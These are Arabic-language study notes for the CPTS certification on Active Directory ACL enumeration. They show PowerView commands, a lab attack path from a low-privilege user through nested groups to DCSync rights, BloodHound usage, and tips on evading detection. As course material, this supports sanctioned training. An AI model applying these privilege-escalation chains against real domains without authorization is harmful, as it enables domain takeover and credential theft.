---
title: "SEC [NUM]: [REPLACE — Section Full Name]"
module: "[REPLACE — Module Name]"
section_num: [REPLACE — NUM]
target: "[REPLACE — TARGET_DOMAIN.LOCAL]"
tags:
  - CPTS
  - [REPLACE-Module-Tag]
  - [REPLACE-Topic-Tag]
difficulty: "[REPLACE — Easy | Medium | Hard]"
vectors: "[REPLACE — SMB | LDAP | WMI | RPC]"
tools: "[REPLACE — Tool1 · Tool2 · Tool3]"
status: "🟢 Complete"
date: "[REPLACE — YYYY-MM-DD]"
---

> [!success] ⚙️ T4E CYBERPUNK NOTES ✦ CPTS CERTIFICATION PATHWAY
> **📍 TARGET NODE:** `[REPLACE: TARGET.DOMAIN.LOCAL]`
> **🔐 ACCESS LEVEL:** `[REPLACE: Authenticated User]`
> **📡 ATTACK VECTOR:** `[REPLACE: SMB / LDAP]`
> 
> **📋 SECTION ID:** `SEC-[REPLACE: NUM]`
> **⚡ DIFFICULTY:** 🟢 `[REPLACE: Medium]`
> **🏁 STATUS:** 🟢 ONLINE — COMPLETE
> 
> **🛠️ KEY TOOLS:** `[REPLACE: Tool1 · Tool2]`
> **🎯 CORE OBJECTIVE:** `[REPLACE: 5-word objective]`
> **📅 DATE:** `[REPLACE: DATE]`

```text
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║                      ████████╗██╗  ██╗███████╗                       ║
║                      ╚══██╔══╝██║  ██║██╔════╝                       ║
║                         ██║   ███████║█████╗                         ║
║                         ██║   ╚════██║██╔══╝                         ║
║                         ██║        ██║███████╗                       ║
║                         ╚═╝        ╚═╝╚══════╝                       ║
║                                                                      ║
║                       [ TECH FOR EVERYONE ]                          ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║  [SYS]      :: NODE INITIALIZED — T4E NOTES v2.0                     ║
║  [SECTION]  :: SEC-[NUM] // [REPLACE: SECTION_TITLE]                 ║
║  [DOMAIN]   :: [REPLACE: TARGET_DOMAIN.LOCAL]                        ║
║  [OPERATOR] :: Hexsein · Al-Nahrain University · CPTS Candidate      ║
║  [CLEARANCE]:: Level-3 // Penetration Testing Pathway                ║
╚══════════════════════════════════════════════════════════════════════╝
```

## ⚡ PHASE_I — النواة النظرية :: المفاهيم والبنية التحتية

> [!success] 📡 PHASE I INITIALIZED · THEORETICAL CORE UPLOAD
> **Language:** Arabic — **Size:** ~2,000 Words
> **Content:** Deep conceptual framework · Infrastructure theory · Hacker mindset · Big picture.

[تمام! استلمت نص السكشن. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 خريطة المفاهيم → 🟡 هيكل السكشن → 🟠 الشرح العميق → 🔴 ما لا يقوله السكشن → 💎 فلاشكاردز → 📄 ورقة غش السكشن

يله نبدأ...

━━━━━

🟢 المرحلة 0: Big Picture — ليش هذا الموضوع موجود؟

⚠️ تخيل وياي هذي القصة:

تخيل إنك دخلت بناية حكومية ضخمة بيها 10,000 غُرفة (هذي هي شبكة الـ Active Directory). إنت لقيت "باج" (ID Card) واقع على الكاع لموظف بسيط اسمه "أحمد" (المستخدم المخترق `wley`).

هسه إنت عندك خيارين:

الخيار الأول: تلزم الباج وتفتر على الـ 10,000 باب، تجرب تفتح باب باب حتى تشوف يا باب يفتح عندك. (هذا يعادل إنك تسحب كل الـ ACLs بالشبكة وتقراها سطر سطر — عملية تاخذ أشهر وتفضحك فوراً).

الخيار الثاني: تروح لغرفة السجلات المركزية، وتبحث بذكاء عن اسم "أحمد" وتشوف بالدفتر: أحمد مسموحله يفتح يا أبواب؟ راح تكتشف إن أحمد يقدر يفتح غرفة "تبديل الملابس"، وبداخل هاي الغرفة اكو باج ثاني يعود لمدير الصيانة، وهذا الباج يفتحلك غرفة السيرفرات!

ليش هذا الموضوع موجود؟

الـ Active Directory بيئة عملاقة ومعقدة بشكل مرعب. أدوات مثل PowerView تقدر تسحبلك "كل" الصلاحيات الموجودة بالدومين. بس المشكلة مو بـ "نقص" المعلومات، المشكلة بـ "غزارة" المعلومات (Information Overload). إذا استخدمت أوامر عامة، راح تغرق بملايين الأسطر من الـ Logs والصلاحيات اللي ما إلها أي قيمة (Noise).

لذلك، جاء هذا السكشن حتى يعلمك مهارة الـ Targeted Enumeration (التعداد المُوجّه). يعلمك شلون تبدأ من نقطة صغيرة (اليوزر اللي إنت مخترقه حالياً) وتتتبع الخيط مثل المحقق الجنائي خطوة بخطوة لحد ما توصل لـ Domain Admin، بدون ما تغرق بالبيانات.

وين يظهر بالواقع؟

بالـ Pentest الحقيقي (Red Teaming)، الوقت هو عدوك، والـ Blue Team (المدافعين) يراقبون حركاتك. إذا سويت Scan لكل الشبكة راح ينصاد الـ Traffic مالتك. بينما إذا استخدمت أوامر PowerShell مخفية بذكاء (Built-in cmdlets) أو حللت البيانات ببرنامج BloodHound، راح تقدر ترسم خريطة الاختراق مال الشركة بثواني وتضرب ضربتك بدون ما حد يحس بيك.

وين يقع هذا السكشن بخريطة CPTS؟

هذا السكشن هو الـ "جسر" بين مرحلة (فهم الصلاحيات) اللي أخذناها بالسكشن السابق، وبين مرحلة (الاستغلال الحقيقي). هنا إنت دتخطط للهجوم وتجمع المعلومات الدقيقة حتى تنفذ.

شنو راح تكون قادر تسوي بعد ما تفهم هالسكشن؟

١. راح تبحث بالـ PowerView بذكاء باستخدام الـ SID بدل البحث العشوائي.

٢. راح تقدر تترجم الأكواد الغريبة (GUIDs) إلى كلمات مفهومة حتى تعرف شنو الصلاحية اللي لزمتها.

٣. راح تقدر تستخدم أوامر الويندوز الأصلية (Native) في حال كانت أدوات الاختراق محظورة.

٤. راح تفهم العقلية وراء أداة BloodHound وكيف ترسم مسارات الاختراق المعقدة (Attack Paths).

━━━━━

🔵 المرحلة 1: خريطة المفاهيم

السكشن مليان مصطلحات تقنية ورموز، خلينا نفلشها ونفهمها بالعراقي البسيط حتى من نقراها بالكود نعرف شنو معناها:

Targeted Enumeration (التعداد الموجه)

- شنو يعني بالعراقي؟ بدل ما تسأل النظام: "انطيني كل الصلاحيات اللي بالشركة"، تسأله: "انطيني بس الصلاحيات الخاصة بهذا اليوزر اللي أنا مخترقه". هذا يقلل الدوخة ويركز جهودك.
    

SID (Security Identifier - المُعرّف الأمني)

- شنو يعني بالعراقي؟ رقم الهوية الموحد بالويندوز. الويندوز غبي من ناحية الأسماء، ما يعرف يوزر اسمه `wley`، يعرفه كرقم طويل يبدأ بـ `S-1-5-21...`. كل أوامر البحث الدقيقة لازم نترجم بيها الاسم إلى SID حتى الويندوز يفهمنا.
    

GUID (Globally Unique Identifier - المُعرّف الفريد العالمي)

- شنو يعني بالعراقي؟ بالويندوز، كل "صلاحية" (مثل تغيير الباسورد، أو قراءة البيانات) إلها كود تسلسلي خاص بيها مو اسم. يعني بدل ما يكتب بالنظام "حق تغيير الباسورد"، يكتب كود مثل `00299570-...`. إذا شفت هذا الكود راح تدوخ لأنك ما تدري هذا الكود يمثل شنو.
    
- وين يظهر؟ يظهر كقيمة بـ `ObjectAceType` من تسحب الـ ACLs.
    

ResolveGUIDs (ترجمة المعرفات)

- شنو يعني بالعراقي؟ هو Flag (مفتاح سحري) نحطه بأداة PowerView. وظيفته ياخذ الأرقام المزعجة (GUIDs) ويترجمها للعربي (أو للإنجليزي المفهوم). يقلب الـ `00299570` إلى `User-Force-Change-Password` حتى إنت تفهم.
    

Nested Groups (المجموعات المتداخلة)

- شنو يعني بالعراقي؟ مثل فكرة الماتريوشكا (اللعابة الروسية). مجموعة ببطن مجموعة. إذا إنت انضفيت لجروب "الدعم الفني"، وجروب "الدعم الفني" أصلاً عضو بجروب "الآي تي"... هذا يعني إنت تلقائياً ورثت كل صلاحيات جروب الآي تي العالية!
    

Transitive Object Control (السيطرة المتعدية)

- شنو يعني بالعراقي؟ تأثير الدومينو. أنا أسيطر على أحمد، وأحمد يسيطر على علي، وعلي يسيطر على السيرفر... إذن أنا أسيطر على السيرفر! BloodHound يحسب هذي السلسلة المتعدية بضغطة زر.
    

DCSync (هجوم مزامنة متحكم المجال)

- شنو يعني بالعراقي؟ أخطر وأقوى هجوم بالـ AD. إذا يوزر عنده صلاحيات معينة (Replication)، يقدر يوهم السيرفر المركزي (DC) ويقوله: "أنا سيرفر ثاني جديد، انطيني نسخة من كل باسووردات الشركة حتى أسويلها مزامنة". السيرفر راح ينطيك الباسووردات كلها بدون أي اختراق!
    

━━━━━

🟡 المرحلة 2: هيكل السكشن — شنو يعلّمك وكيف؟

📖 ترجمة عنوان السكشن وموضوعه:

السكشن اسمه "ACL Enumeration" يعني "تعداد قوائم التحكم بالوصول". يقع هذا السكشن ضمن موديول هجمات الأكتيف دايركتوري في مسار CPTS.

🎯 ماذا يريد هذا السكشن أن تتعلم؟

١. استخدام أدوات سطر الأوامر (PowerView) للبحث الدقيق عن الصلاحيات لحساب تملكه.

٢. بناء سكربتات بسيطة بالـ PowerShell للبحث إذا كانت الأدوات الهجومية محظورة.

٣. تتبع مسار هجوم معقد (Attack Path) يتكون من عدة قفزات (User -> Group -> Group -> User -> Domain).

٤. ترجمة هذا التتبع اليدوي المتعب إلى رؤية بصرية سهلة باستخدام أداة BloodHound.

📐 هيكل المحتوى (Section Blueprint):

السكشن مقسم لجزأين رئيسيين، وكل جزء يبني على الثاني:

الجزء الأول: [PowerView & Manual PowerShell] — يشرح المشكلة (كثرة البيانات) والحل (البحث عن SID محدد). ثم يعلمك كيف تترجم الـ GUID، وينطيك بديل "Native" (كود PowerShell خام) للمحترفين.

الجزء الثاني: [تتبع مسار الهجوم] — هنا التطبيق العملي. ياخذك برحلة اختراق واقعية من يوزر `wley` إلى أن توصل للسيطرة على الدومين عبر 4 قفزات متتالية.

الجزء الثالث: [الرؤية البصرية بـ BloodHound] — يراويك نفس الرحلة اللي تعبت بيها فوق، بس كيف تطلعلك مرسومة وجاهزة ببرنامج BloodHound لتسهيل حياة الـ Pentester.

تدفق التعلم:

```
[الفشل في البحث العشوائي]
       │
       ▼
[البحث الذكي (Targeted) باستخدام SID]
       │
       ▼
[تخطي عقبة الـ GUIDs الغامضة]
       │
       ▼
[قفزات الاختراق: وراثة الجروبات (Nested Groups)]
       │
       ▼
[BloodHound: الخريطة السحرية اللي تختصر كل ما سبق]
```

🔗 المتطلبات السابقة:

لازم تكون فاهم شنو يعني ACEs و ACLs (السكشن اللي قبله مباشرة)، وتعرف شنو يعني `GenericWrite` و `ForceChangePassword`. ولازم تعرف أساسيات PowerShell (شنو يعني Pipe `|` وشنو يعني متغيّر `$`).

⚠️ ما يذكره السكشن ضمنياً بدون توضيح:

- يفترض إنك منزل أداة PowerView بحاسبتك أو حاسبة الضحية وجاهز تسويلها Import.
    
- يفترض إنك مسوي Run لبرنامج `SharpHound` بالخلفية وساحب الداتا ومستوردها لـ BloodHound (لهذا جاب سيرة صور BloodHound مباشرة بدون ما يعلمك شلون تسحب الداتا، لأن افترض إنك تعرفها من موديولات سابقة).
    

━━━━━

🟠 المرحلة 3: الشرح العميق

هسه راح ندخل بالعمق، سطر سطر وكود كود، ونفصّل هذي الرحلة الممتعة.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم/التقنية [١]: مشكلة الضوضاء والبحث الذكي (Targeted Enumeration)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

أداة PowerView بيها أمر جاهز يجيبلك الأشياء المهمة، اسمه `Find-InterestingDomainAcl`. السكشن يكولك: لا تستخدمه ببيئة كبيرة! لأن راح يطبعلك آلاف الأسطر بالشاشة وراح تضيع (مثل ما واضح بالـ Output الطويل بالنص). الحل هو إنك تلزم اليوزر اللي إنت اخترقته (مثلاً `wley`)، تحول اسمه إلى رقم SID، وتدور بالشبكة بس على الأماكن اللي هذا الرقم إله صلاحية بيها.

🎭 التشبيه:

مثل شخص مضيع محفظته بمول كبير. الأمر الأول (البحث العشوائي) يخليك تدور بكل محلات المول. الأمر الثاني (Targeted) يخليك تروح لكاميرات المراقبة وتتبع خط سيرك إنت فقط، وين مشيت وين رحت، وتدور بس بهذي الأماكن.

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

الـ Active Directory يخزن الصلاحيات (ACLs) بناءً على الـ Security Identifiers (SID). حتى نسوي فلترة (Filtering) قوية بالـ PowerShell، لازم نسحب الـ SID مال اليوزر اللي نريده، ونطلب من الويندوز يقارنه وي كل الـ ACEs بالدومين.

🔧 الأمر (تحويل الاسم إلى SID ثم البحث):

PowerShell

```
# Step 1: Convert the compromised username to a SID
$sid = Convert-NameToSid wley

# Step 2: Search for any object where our SID is listed in the ACL
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

💬 شرح الـ flags والأوامر:

- `$sid = Convert-NameToSid`: هذا أمر بـ PowerView ياخذ اسم اليوزر `wley` ويحوله لرقم مثل `S-1-5-21...` ويخزنه بمتغير اسمه `$sid`.
    
- `Get-DomainObjectACL -Identity *`: هذا الأمر يسحب **كل** الصلاحيات مال **كل** شيء بالشبكة (الـ `*` تعني الكل). راح ياخذ وقت طويل.
    
- `|`: هذا الـ Pipe ياخذ جبل البيانات اللي طلعه الأمر الأول، ويدخله بفلتر.
    
- `?`: اختصار لكلمة `Where-Object` بالباورشيل (أداة تصفية).
    
- `{$_.SecurityIdentifier -eq $sid}`: الـ `$_` تعني (العنصر الحالي اللي ديمر بالفلتر). نقول للباورشيل: إذا جان حقل الـ `SecurityIdentifier` مال هذا العنصر يساوي (`-eq`) الـ `$sid` مالتنا اللي خزنناه، اطبعلي إياه، وإذا لا.. ارميه!
    

Plaintext

```
ASCII Diagram - The PowerView Filter Flow:

[All 50,000 AD ACLs]
       │
       ▼
   [ Pipe | ]
       │
       ▼
[Filter: Is SecurityIdentifier == wley's SID?]
       ├── NO  ─► (Discarded)
       ├── NO  ─► (Discarded)
       └── YES ─► [Output to Attacker Screen]
```

⏸️ نقطة توقف — ماذا فهمنا لحد هسة؟:

فهمنا إن البحث العشوائي مضيعة للوقت، وإنه الفلترة بالباورشيل باستخدام الـ SID هي الطريقة الاحترافية للبحث عن "ماذا أستطيع أن أفعل باليوزر الذي أملكه الآن".

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم/التقنية [٢]: فك شفرة الـ GUIDs (استخدام -ResolveGUIDs)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

لما تنفذ أمر البحث اللي فوق، راح يطلعلك إن يوزر `wley` عنده صلاحية على يوزر اسمه `damundsen`. بس من تقرا نوع الصلاحية (بحقل اسمه `ObjectAceType`) راح تلقاها كود أرقام غريب جداً `00299570-246d-11d0-a768-00aa006e0529`. إنت كمخترق ما راح تعرف هذي شنو: هل هي حق قراءة؟ حق كتابة؟ تغيير باسورد؟ الحل إما تبحث عنها بجوجل، أو تخلي الأداة تترجمها إلك برمجياً.

🎭 التشبيه:

تخيل الدكتور كتبلك وصفة دوه بشفرة طبية، تروح للصيدلاني تقوله "انطيني دوه رقم 458"، الصيدلاني يباوع بالسيستم يترجم الرقم ويكولك: "آه، هذا براسيتامول". الـ ResolveGUIDs هو الصيدلاني مالتك.

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

مايكروسوفت تستخدم الـ GUIDs (أرقام فريدة عالمية بحجم 128-bit) لتعريف الخصائص بالـ Schema مال الأكتيف دايركتوري حتى تتجنب تكرار الأسماء (Name Collision) بين البرامج المختلفة. هذا مفيد للنظام، بس سيء جداً للقراءة البشرية.

🔧 الأمر (تفعيل الترجمة التلقائية):

PowerShell

```
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

💬 شرح الـ flags:

- `-ResolveGUIDs`: هذا المفتاح السحري يطلب من أداة PowerView إنها تتصل بقاعدة بيانات الأكتيف دايركتوري بالخلفية، وتسأل عن كل GUID وتستبدله بالاسم البشري المفهوم (DisplayName) قبل ما تطبعه على الشاشة.
    

📤 الـ Output المتوقع (بعد الترجمة):

Plaintext

```
AceQualifier           : AccessAllowed
ObjectDN               : CN=Dana Amundsen...
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password   <-- (Bingo! الترجمة نجحت)
...
```

🔍 كيف تقرأ الـ Output؟:

هسه صارت واضحة! الـ `ObjectDN` هو الضحية (Dana Amundsen). والـ `ObjectAceType` هو الثغرة اللي لزمناها (نقدر نغير باسووردها بدون ما نعرف الباسوورد القديم!).

❓ الـ "بس ليش؟":

"ليش السكشن انطاني كود طويل يسوي Reverse Search بالباورشيل إذا الـ ResolveGUIDs يحل المشكلة بكلمة وحدة؟"

لأن أدوات مثل PowerView ممكن تكون مكشوفة وممحذوفة من قبل الـ Antivirus. كـ Hacker محترف، لازم تعرف "شلون" الأداة تشتغل تحت الغطاء باستخدام أوامر باورشيل عادية مثل `Get-ADObject` حتى إذا الأداة انحظرت، إنت تكتب الكود بيدك.

⏸️ نقطة توقف — ماذا فهمنا لحد هسة؟:

عرفنا شلون نبحث، والأهم عرفنا شلون نخلي نواتج البحث مفهومة ومقروءة لنا كبشر باستخدام ترجمة الـ GUIDs. هسه مسكنا أول خيط للاختراق (`wley` يقدر يضرب `damundsen`).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم/التقنية [٣]: بناء مسار الهجوم المتسلسل (Attack Path Chaining)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

هنا المتعة الحقيقية للسكشن! السكشن راح ياخذنا برحلة "قفزات" متتالية. كل ما نسيطر على يوزر، نستخدمه حتى نكتشف شنو يقدر يسوي، ونسيطر على اللي بعده، لحد ما نوصل لقلب الشركة. السكشن يراويك هذا المسار برمجياً خطوة بخطوة.

🎭 التشبيه:

مثل لعبة السلالم والثعابين (أو الماريو). إنت هسه بشخصية `wley`، لزمت نجمة خلتك تاكل شخصية `damundsen`. هسه إنت صرت `damundsen`، دورت بجيوبك لقيت مفتاح يفتحلك باب جروب "مستوى الدعم الفني 1". دخلت للجروب، لقيت هذا الجروب أصلاً معزوم بحفلة كبار الشخصيات بجروب "تكنولوجيا المعلومات". دخلت للحفلة ولقيت مدير اسمه `adunn` وقدرت تسيطر عليه. هذا المدير عنده مفاتيح الخزنة الرئيسية مال البنك (DCSync).

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

هذا هو تجسيد لثغرات (Misconfigurations) الإدارة بالشركات. الأدمنية ينطون صلاحيات بشكل فوضوي ومرور السنين تتراكم، ويصير تداخل (Nesting) بالجروبات. המهاجم يجمع هذي الفوضى البسيطة ويحولها لسلسلة قاتلة.

🔧 القفزة الأولى: من damundsen إلى الجروب:

بعد ما سحبنا باسورد damundsen وغيرناه، خلينا نشوف هو شنو يملك:

PowerShell

```
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
```

📤 النتيجة المختصرة: يوزر `damundsen` يملك `GenericWrite` على جروب اسمه `Help Desk Level 1`. (يعني يقدر يضيف أي شخص لهذا الجروب).

🔧 القفزة الثانية: اكتشاف الجروبات المتداخلة (Nested Groups):

نجي نفحص هذا الجروب، هل هو مهم؟

PowerShell

```
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
```

📤 النتيجة: `CN=Information Technology...`

معناها جروب "الهيلب ديسك" هو عضو بجروب أكبر وأخطر اسمه "الآي تي". إذا ضفنا نفسنا بالهيلب ديسك، راح نورث كل أسلحة جروب الآي تي.

🔧 القفزة الثالثة: من جروب الآي تي إلى الهدف السمين:

شنو يملك جروب الآي تي؟

PowerShell

```
$itgroupsid = Convert-NameToSid "Information Technology"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid}
```

📤 النتيجة: يملكون `GenericAll` (سيطرة تامة) على يوزر اسمه `adunn` (أنجيلا).

🔧 القفزة الرابعة: أنجيلا تملك الدومين!

نفحص أنجيلا:

PowerShell

```
$adunnsid = Convert-NameToSid adunn 
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid}
```

📤 النتيجة: أنجيلا تملك `DS-Replication-Get-Changes`. هذي مو صلاحية عادية، هذا المفتاح النووي! هذي الصلاحية تسمحلك تنفذ هجوم DCSync وتسحب باسوورد الـ Administrator الكبير.

Plaintext

```
ASCII Diagram - The Complete Attack Path:

[wley] ──(ForceChangePassword)──► [damundsen] 
                                      │
                             (GenericWrite - AddMember)
                                      ▼
                           [Help Desk Level 1 Group]
                                      │
                                 (Member Of)
                                      ▼
                        [Information Technology Group]
                                      │
                                (GenericAll)
                                      ▼
                                   [adunn]
                                      │
                              (DS-Replication)
                                      ▼
                            [DOMAIN COMPROMISE (DCSync)]
```

⏸️ نقطة توقف — ماذا فهمنا لحد هسة؟:

فهمنا إن الاختراق مو ثغرة وحدة تنضرب، بل هو تجميع לـ "بازل" (Puzzle) من الصلاحيات الشرعية الخاطئة، وحدة توصل للثانية.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم/التقنية [٤]: الرؤية البصرية بـ BloodHound

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

كل هالكود والتعب والبحث بالـ PowerView، يكلف وقت وجهد ودوخة بالعيون. أداة BloodHound إجت حتى تسوي كل هذا بالنيابة عنك وتطلعلك إياه كـ "رسمة" (Graph). ترفع بيها البيانات، وتختار يوزرك، وهي تطلعلك الأسهم والألوان وتقولك: اضغط هنا حتى تخترق هذا!

🎭 التشبيه:

الـ PowerView هو كأنك تمشي بالمدينة وتفتح خريطة ورقية تسأل الناس عن الطريق شارع شارع. الـ BloodHound هو الـ Google Maps (GPS). يقولك: امشِ من هنا، واخذ يمين، راح توصل للهدف بأقصر طريق، ويراويك إياها ملونة.

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

BloodHound مبني على تقنية اسمها "Graph Theory" (نظرية المخططات). هو يشوف الأكتيف دايركتوري كـ "Nodes" (عقد = يوزرات أو جروبات) و "Edges" (حواف = نوع الصلاحية اللي تربطهم). هذا يخليه يقدر يحسب "أقصر مسار للاختراق" (Shortest Path) بثواني رياضياً.

🔍 كيف تقرأ الـ BloodHound (من الصور المرفقة بالسكشن):

- التبويب `Node Info`: من تضغط على يوزر مثل `wley`، راح يطلعلك مربع عاليسار.
    
- `Outbound Control Rights`: هذي هي الأسلحة اللي تملكها. الصلاحيات اللي تطلع "منك" للآخرين.
    
- `First Degree Object Control`: الأهداف اللي تقدر تضربها بشكل مباشر (قفزة وحدة). مثل `damundsen`.
    
- `Transitive Object Control`: الأهداف اللي تقدر تضربها بشكل "غير مباشر" (عبر عدة قفزات). بالصورة مكتوب رقم 16! يعني إنت بطريقة غير مباشرة تقدر تسيطر على 16 كائن بالشبكة بسلسلة اختراقات!
    
- `Help Edge`: إذا دست كلك أيمن على السهم بين `wley` و `damundsen`، الأداة راح تعطيك الشرح، والكود الجاهز للاستغلال، وحتى نصائح الـ OPSEC حتى ما تنكشف.
    

⏸️ نقطة توقف — ماذا فهمنا لحد هسة؟:

فهمنا إن BloodHound هي الأداة السحرية اللي تحلل كل فوضى الـ ACLs وتترجمها لخريطة هجوم جاهزة للتنفيذ، وتستبدل ساعات من شغل הـ PowerView اليدوي.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 ملخص ما تعلمنا:

|**المفهوم / الأداة**|**ما تعني / وظيفتها**|**متى تستخدمها**|
|---|---|---|
|`Convert-NameToSid`|تحويل الاسم لرقم هوية الويندوز|في بداية أي بحث دقيق بالـ PowerView|
|`-ResolveGUIDs`|ترجمة الأكواد المعقدة لأسماء مفهومة|دائماً مع `Get-DomainObjectACL` لفهم النتائج|
|Targeted Enumeration|البحث الموجه المنطلق من حساب مخترق|لتقليل الضوضاء وتجنب إنذار فرق الحماية|
|Nested Groups|الجروبات المتداخلة التي تورث الصلاحيات|للبحث عن طرق لرفع الصلاحيات بشكل متعدٍ (Transitive)|
|BloodHound|أداة التحليل البصري ورسم مسارات الاختراق|كبديل سريع وآلي لكل خطوات التعداد اليدوية|

━━━━━

🔴 المرحلة 4: ما لا يقوله السكشن

هنا راح أنطيك الـ "أسرار" اللي المحترفين يعرفوها والسكشن ما ركز عليها بشكل كافي:

🕳️ الثغرات في شرح السكشن:

١. بطء الـ PowerView في البيئات الضخمة:

السكشن ذكر إن الأمر `Get-DomainObjectACL -Identity *` "ياخذ 1-2 دقيقة باللاب". بالواقع (الشركات اللي بيها 50,000 يوزر)، هذا الأمر راح يخلي الحاسبة تعلق وممكن يطول "ساعات" ويسحب جيجابايتات من الرام، وممكن نظام الـ EDR يسوي Kill للبروسيس مالتك! لذلك بالواقع إحنا نعتمد 99% على SharpHound (الخاص ببلودهوند) لأنه مصمم ومبرمج بـ C# حتى يسحب الداتا بسرعة خيالية وبأقل ضغط على الشبكة.

٢. السكشن ما شرح أداة SharpHound:

فجأة السكشن كلك "خلي نرفع الداتا للـ BloodHound". منين إجت الداتا؟ إجت من سكربت اسمه SharpHound لازم تشغله أول شي بالحاسبة المخترقة حتى يسحب כל הـ ACLs ويضغطها بملف zip، وبعدين تنقل هذا الملف لحاسبة الكالي مالتك وترفعه للبلودهوند.

⚠️ الـ Gotchas عند تطبيق هذا بالـ Lab أو الواقع:

١. فخ تفعيل الصلاحية (Token Refresh):

بالـ Attack Path، السكشن كلك: "إنت عندك GenericWrite، ضيف نفسك لجروب Help Desk واستمتع بالصلاحيات".

الـ Gotcha: إذا ضفت نفسك بالجروب عبر سطر الأوامر، الصلاحيات **ما راح تتفعل فوراً**! الويندوز يحسب صلاحيات الجروبات بس لحظة تسجيل الدخول (Logon). حتى تتفعل صلاحياتك، لازم تسوي Log off وترجع تسوي Log on، أو تستخدم تقنيات متقدمة مثل `klist purge` وطلب تذكرة Kerberos جديدة. مبتدئين الـ HTB يظلون ساعات يكتبون أوامر وتطلعهم Access Denied لأنهم ناسين يحدثون الـ Session.

٢. الثقة العمياء بـ BloodHound:

أداة BloodHound ترسم مسارات الهجوم بناءً على "وقت سحب البيانات". إذا إنت سحبت الداتا يوم الأحد، وبدأت الهجوم يوم الثلاثاء، ممكن يكون الأدمن مسح صلاحية `GenericAll`! إذا جربت تهاجم وفشلت، ارجع لـ PowerView وتأكد من الصلاحية بـ (Real-time).

🔗 ربط بسكاشن/موديولات أخرى:

- الموديول ذكر `DS-Replication-Get-Changes`. هذا المفهوم راح تدرسه بالتفصيل الممل بموديول `Attacking Domain Services` وتحديداً בסקשן الـ `DCSync`.
    
- هجوم الكيربيروستينج (Kerberoasting) اللي ذكره כـ خيار للاستغلال عبر `GenericAll` موجود بالتفصيل بموديول `Kerberos Attacks`.
    

🌍 السياق الحقيقي (Real Pentest Context):

بالـ Red Teaming الحقيقي، الـ BloodHound هو سيف ذو حدين. تشغيل SharpHound لسحب הדاتا يسوي "عاصفة" من الاستعلامات (LDAP Queries). أنظمة الحماية الحديثة مثل Microsoft Defender for Identity (MDI) تصيد הـ SharpHound فوراً! بهيج حالة، الهاكر المحترف يتخلى عن سهولة BloodHound، ويرجع يستخدم "كود הـ foreach loop" اللي شفناه بالسكشن، لأنه كود Native (أصلي بالويندوز) بطيء جداً وهادئ، وما ينطي إنذارات للـ Blue Team (هذا نسميه Living off the Land).

🏆 النصيحة الذهبية للـ CPTS Exam:

بامتحان الـ CPTS، لا تتعب نفسك بالتتبع اليدوي العميق بالـ PowerView إذا ما كنت مضطر. مجرد ما تثبت قدمك بأول يوزر، اسحب الداتا بـ SharpHound، ارفعها لـ BloodHound، واستخدم تبويب `Shortest Paths` -> `Find Shortest Paths to Domain Admins`. راح يوفر عليك ساعات من التوهان ويحطك على بداية الخيط فوراً. استخدم PowerView فقط كـ "أداة تأكيد" (Verification) للخطوة اللي تريد تنفذها هسه.

━━━━━

💎 الفلاشكاردز — ملخص السكشن للحفظ

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #1

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: لماذا لا ينصح باستخدام `Find-InterestingDomainAcl` في بيئات AD ضخمة؟

✅ Back: لأنه يقوم ببحث شامل يعيد كمية هائلة من البيانات (Noise) يصعب تحليلها، ويستغرق وقتاً طويلاً وقد يثير إنذارات الحماية.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #2

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو الغرض من الأمر `Convert-NameToSid` قبل بدء البحث بالـ PowerView؟

✅ Back: قوائم الـ ACL تستخدم أرقام הـ SID وليس الأسماء لتسجيل الصلاحيات، لذلك يجب تحويل اسم المستخدم المخترق لـ SID للبحث عن صلاحياته (Targeted Enumeration).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #3

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما وظيفة الـ flag `-ResolveGUIDs` في أوامر PowerView؟

✅ Back: يقوم بترجمة أكواد הـ GUIDs المعقدة (مثل أرقام `ObjectAceType`) إلى أسماء مقروءة للبشر تمثل الصلاحيات الفعلية (مثل User-Force-Change-Password).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #4

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو مفهوم الـ Nested Groups (المجموعات المتداخلة) وكيف يفيد المهاجم؟

✅ Back: هو وجود مجموعة داخل مجموعة أخرى. المهاجم يستفيد منه بـ "وراثة" صلاحيات المجموعة الأكبر بمجرد إضافته للمجموعة الأصغر (Transitive Object Control).

